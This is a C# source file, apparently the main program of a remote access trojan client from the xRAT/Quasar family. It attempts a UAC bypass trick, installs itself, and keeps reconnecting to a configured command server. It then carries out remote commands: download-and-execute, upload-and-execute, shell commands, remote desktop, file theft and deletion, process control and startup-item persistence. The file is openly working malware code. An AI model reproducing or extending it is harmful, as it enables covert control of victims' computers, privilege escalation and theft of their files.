using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using xClient.Config;
using xClient.Core;
using xClient.Core.Commands;
using xClient.Core.Packets;

namespace xClient
{
    internal static class Program
    {
        public static Client ConnectClient;
        private static bool _reconnect = true;
        private static volatile bool _connected = false;
        private static Mutex _appMutex;

        [STAThread]
        private static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            Settings.Initialize();
            Initialize();
            if (!SystemCore.Disconnect)
                Connect();

            Cleanup();
        }

        private static void Cleanup()
        {
            CommandHandler.CloseShell();
            if (CommandHandler.LastDesktopScreenshot != null)
                CommandHandler.LastDesktopScreenshot.Dispose();
            if (_appMutex != null)
                _appMutex.Close();

            CommandHandler.StreamCodec = null;
        }

        private static void InitializeClient()
        {
            ConnectClient = new Client();

            ConnectClient.AddTypesToSerializer(typeof (IPacket), new Type[]
            {
                typeof (Core.Packets.ServerPackets.InitializeCommand),
                typeof (Core.Packets.ServerPackets.Disconnect),
                typeof (Core.Packets.ServerPackets.Reconnect),
                typeof (Core.Packets.ServerPackets.Uninstall),
                typeof (Core.Packets.ServerPackets.DownloadAndExecute),
                typeof (Core.Packets.ServerPackets.UploadAndExecute),
                typeof (Core.Packets.ServerPackets.Desktop),
                typeof (Core.Packets.ServerPackets.GetProcesses),
                typeof (Core.Packets.ServerPackets.KillProcess),
                typeof (Core.Packets.ServerPackets.StartProcess),
                typeof (Core.Packets.ServerPackets.Drives),
                typeof (Core.Packets.ServerPackets.Directory),
                typeof (Core.Packets.ServerPackets.DownloadFile),
                typeof (Core.Packets.ServerPackets.MouseClick),
                typeof (Core.Packets.ServerPackets.GetSystemInfo),
                typeof (Core.Packets.ServerPackets.VisitWebsite),
                typeof (Core.Packets.ServerPackets.ShowMessageBox),
                typeof (Core.Packets.ServerPackets.Update),
                typeof (Core.Packets.ServerPackets.Monitors),
                typeof (Core.Packets.ServerPackets.ShellCommand),
                typeof (Core.Packets.ServerPackets.Rename),
                typeof (Core.Packets.ServerPackets.Delete),
                typeof (Core.Packets.ServerPackets.Action),
                typeof (Core.Packets.ServerPackets.GetStartupItems),
                typeof (Core.Packets.ServerPackets.AddStartupItem),
                typeof (Core.Packets.ServerPackets.DownloadFileCanceled),
                typeof (Core.Packets.ClientPackets.Initialize),
                typeof (Core.Packets.ClientPackets.Status),
                typeof (Core.Packets.ClientPackets.UserStatus),
                typeof (Core.Packets.ClientPackets.DesktopResponse),
                typeof (Core.Packets.ClientPackets.GetProcessesResponse),
                typeof (Core.Packets.ClientPackets.DrivesResponse),
                typeof (Core.Packets.ClientPackets.DirectoryResponse),
                typeof (Core.Packets.ClientPackets.DownloadFileResponse),
                typeof (Core.Packets.ClientPackets.GetSystemInfoResponse),
                typeof (Core.Packets.ClientPackets.MonitorsResponse),
                typeof (Core.Packets.ClientPackets.ShellCommandResponse),
                typeof (Core.Packets.ClientPackets.GetStartupItemsResponse)
            });

            ConnectClient.ClientState += ClientState;
            ConnectClient.ClientRead += ClientRead;
        }

        private static void Initialize()
        {
            Thread.Sleep(2000);

            SystemCore.OperatingSystem = SystemCore.GetOperatingSystem();
            SystemCore.MyPath = Application.ExecutablePath;
            SystemCore.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
            SystemCore.AccountType = SystemCore.GetAccountType();
            SystemCore.InitializeGeoIp();

            if (Settings.ENABLEUACESCALATION)
            {
                if (SystemCore.TryUacTrick())
                    SystemCore.Disconnect = true;

                if (SystemCore.Disconnect)
                    return;
            }

            if (!Settings.INSTALL || SystemCore.MyPath == SystemCore.InstallPath)
            {
                if (!SystemCore.CreateMutex(ref _appMutex))
                    SystemCore.Disconnect = true;

                if (SystemCore.Disconnect)
                    return;

                new Thread(SystemCore.UserIdleThread).Start();

                InitializeClient();
            }
            else
            {
                if (!SystemCore.CreateMutex(ref _appMutex))
                    SystemCore.Disconnect = true;

                if (SystemCore.Disconnect)
                    return;

                SystemCore.Install();
            }
        }

        private static void Connect()
        {
            TryAgain:
            Thread.Sleep(250 + new Random().Next(0, 250));

            if (!_connected)
                ConnectClient.Connect(Settings.HOST, Settings.PORT);

            Thread.Sleep(200);

            Application.DoEvents();

            HoldOpen:
            while (_connected) // hold client open
            {
                Application.DoEvents();
                Thread.Sleep(2500);
            }

            Thread.Sleep(Settings.RECONNECTDELAY + new Random().Next(250, 750));

            if (SystemCore.Disconnect)
            {
                ConnectClient.Disconnect();
                return;
            }

            if (_reconnect && !SystemCore.Disconnect && !_connected)
                goto TryAgain;
            else
                goto HoldOpen;
        }

        private static void ClientState(Client client, bool connected)
        {
            _connected = connected;

            if (connected && !SystemCore.Disconnect)
                _reconnect = true;
            else if (!connected && SystemCore.Disconnect)
                _reconnect = false;
            else
                _reconnect = !SystemCore.Disconnect;
        }

        private static void ClientRead(Client client, IPacket packet)
        {
            var type = packet.GetType();

            if (type == typeof (Core.Packets.ServerPackets.InitializeCommand))
            {
                CommandHandler.HandleInitializeCommand((Core.Packets.ServerPackets.InitializeCommand) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.DownloadAndExecute))
            {
                CommandHandler.HandleDownloadAndExecuteCommand((Core.Packets.ServerPackets.DownloadAndExecute) packet,
                    client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.UploadAndExecute))
            {
                CommandHandler.HandleUploadAndExecute((Core.Packets.ServerPackets.UploadAndExecute) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Disconnect))
            {
                CommandHandler.CloseShell();
                SystemCore.Disconnect = true;
                client.Disconnect();
            }
            else if (type == typeof (Core.Packets.ServerPackets.Reconnect))
            {
                CommandHandler.CloseShell();
                client.Disconnect();
            }
            else if (type == typeof (Core.Packets.ServerPackets.Uninstall))
            {
                CommandHandler.HandleUninstall((Core.Packets.ServerPackets.Uninstall) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Desktop))
            {
                CommandHandler.HandleRemoteDesktop((Core.Packets.ServerPackets.Desktop) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.GetProcesses))
            {
                CommandHandler.HandleGetProcesses((Core.Packets.ServerPackets.GetProcesses) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.KillProcess))
            {
                CommandHandler.HandleKillProcess((Core.Packets.ServerPackets.KillProcess) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.StartProcess))
            {
                CommandHandler.HandleStartProcess((Core.Packets.ServerPackets.StartProcess) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Drives))
            {
                CommandHandler.HandleDrives((Core.Packets.ServerPackets.Drives) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Directory))
            {
                CommandHandler.HandleDirectory((Core.Packets.ServerPackets.Directory) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.DownloadFile))
            {
                CommandHandler.HandleDownloadFile((Core.Packets.ServerPackets.DownloadFile) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.MouseClick))
            {
                CommandHandler.HandleMouseClick((Core.Packets.ServerPackets.MouseClick) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.GetSystemInfo))
            {
                CommandHandler.HandleGetSystemInfo((Core.Packets.ServerPackets.GetSystemInfo) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.VisitWebsite))
            {
                CommandHandler.HandleVisitWebsite((Core.Packets.ServerPackets.VisitWebsite) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.ShowMessageBox))
            {
                CommandHandler.HandleShowMessageBox((Core.Packets.ServerPackets.ShowMessageBox) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Update))
            {
                CommandHandler.HandleUpdate((Core.Packets.ServerPackets.Update) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Monitors))
            {
                CommandHandler.HandleMonitors((Core.Packets.ServerPackets.Monitors) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.ShellCommand))
            {
                CommandHandler.HandleShellCommand((Core.Packets.ServerPackets.ShellCommand) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Rename))
            {
                CommandHandler.HandleRename((Core.Packets.ServerPackets.Rename) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Delete))
            {
                CommandHandler.HandleDelete((Core.Packets.ServerPackets.Delete) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.Action))
            {
                CommandHandler.HandleAction((Core.Packets.ServerPackets.Action) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.GetStartupItems))
            {
                CommandHandler.HandleGetStartupItems((Core.Packets.ServerPackets.GetStartupItems) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.AddStartupItem))
            {
                CommandHandler.HandleAddStartupItem((Core.Packets.ServerPackets.AddStartupItem) packet, client);
            }
            else if (type == typeof (Core.Packets.ServerPackets.DownloadFileCanceled))
            {
                CommandHandler.HandleDownloadFileCanceled((Core.Packets.ServerPackets.DownloadFileCanceled) packet,
                    client);
            }
        }
    }
}